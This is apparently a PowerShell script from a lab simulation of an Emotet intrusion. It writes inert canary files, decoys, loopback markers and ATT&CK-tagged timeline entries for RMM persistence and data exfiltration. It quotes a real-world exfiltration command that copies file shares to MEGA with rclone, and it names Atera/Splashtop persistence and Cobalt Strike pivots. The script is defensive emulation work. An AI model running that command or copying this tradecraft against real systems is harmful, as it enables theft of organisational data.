#Requires -Version 5.1
#Requires -RunAsAdministrator
[CmdletBinding()]param([switch]$LabConfirmed)
. "$PSScriptRoot\EmotetRcloneSim-utilities.ps1"
Assert-EmotetRcloneSafety -LabConfirmed:$LabConfirmed
$p = Initialize-EmotetRcloneEnvironment

Write-EmotetRcloneFile (Join-Path $p.Payloads '1.msi') 'INERT ATERA MSI-NAME CANARY. Not an installer.' 'Atera persistence canary'
Write-EmotetRcloneFile (Join-Path $p.Payloads 'Splashtop-Atera.msi') 'INERT SPLASHTOP/ATERA MSI-NAME CANARY. Not an installer.' 'alternate RMM canary'
$rmm = Join-Path $p.Payloads 'AteraAgent.exe'
New-EmotetRcloneDecoy $rmm 'Atera/Splashtop stand-in'
Invoke-EmotetRcloneDecoy $rmm 'msiexec /i 1.msi; Atera agent and Splashtop service installation' 'Cobalt beacon'
Write-EmotetRcloneFile (Join-Path $p.Evidence 'rmm-negative-record.json') (@{installersExecuted=0;AteraInstalled=$false;SplashtopInstalled=$false;servicesCreated=0;remoteSessions=0;persistenceChanges=0} | ConvertTo-Json) 'RMM safety record'

$finance = Join-Path $p.Shares 'Shares\Finance'
$it = Join-Path $p.Shares 'Shares\IT'
Write-EmotetRcloneFile (Join-Path $finance 'Quarterly-Forecast.xlsx') 'GENERATED FINANCE CANARY. No organizational data.' 'generated collection target'
Write-EmotetRcloneFile (Join-Path $finance 'Vendor-Contracts.docx') 'GENERATED CONTRACT CANARY. No organizational data.' 'generated collection target'
Write-EmotetRcloneFile (Join-Path $it 'Network-Inventory.csv') "host,role`nLAB-SRV01.invalid,generated-file-server" 'generated collection target'
Write-EmotetRcloneFile (Join-Path $it 'Recovery-Runbook.docx') 'GENERATED IT CANARY. No organizational data.' 'generated collection target'
$rclone = Join-Path $p.Payloads 'rclone.exe'
New-EmotetRcloneDecoy $rclone 'Rclone/MEGA exfiltration stand-in'
$reported = 'rclone.exe copy \\REDACTED\Shares mega:Shares -q --ignore-existing --auto-confirm --multi-thread-streams 4 --transfers 4'
foreach ($offset in @(55,64,82)) {
    Invoke-EmotetRcloneDecoy $rclone $reported 'Cobalt beacon'
    Invoke-EmotetRcloneLoopback 443 "MEGA cloud storage; reported command: $reported" 'Rclone HTTPS marker'
    Add-EmotetRcloneTimeline $offset exfiltration 'Rclone copy to MEGA represented' @{source='generated share canaries only';filesRead=0;archivesCreated=0;bytesTransferred=0;technique='T1567.002'}
}
Write-EmotetRcloneFile (Join-Path $p.Evidence 'collection-exfiltration-negative-record.json') (@{generatedCanaryFiles=4;realSharesAccessed=0;realFilesRead=0;cloudAccountsAccessed=0;archivesCreated=0;bytesTransferred=0;IOCConnections=0} | ConvertTo-Json) 'exfiltration safety record'
Write-EmotetRcloneFile (Join-Path $p.Evidence 'outcome-record.json') (@{caseDurationDays=4;ransomwareObserved=$false;impactActions=0;securityControlsChanged=0;logsCleared=0;shadowCopiesDeleted=0;userFilesEncrypted=0;outcome='evicted before impact'} | ConvertTo-Json) 'case outcome record'
Add-EmotetRcloneTimeline 34 persistence 'Atera 1.msi deployment to server represented' @{softwareInstalled=0;servicesCreated=0;technique='T1219'}
Add-EmotetRcloneTimeline 50 lateral-movement 'Day-three Cobalt workstation pivots and alternate Atera/Splashtop deployment represented' @{remoteHostsTouched=0;softwareInstalled=0}
Add-EmotetRcloneTimeline 96 conclusion 'Four-day intrusion ends after repeated file-server and IT-data exfiltration attempts; no ransomware observed' @{bytesTransferred=0;impactActions=0;ransomwareObserved=$false}
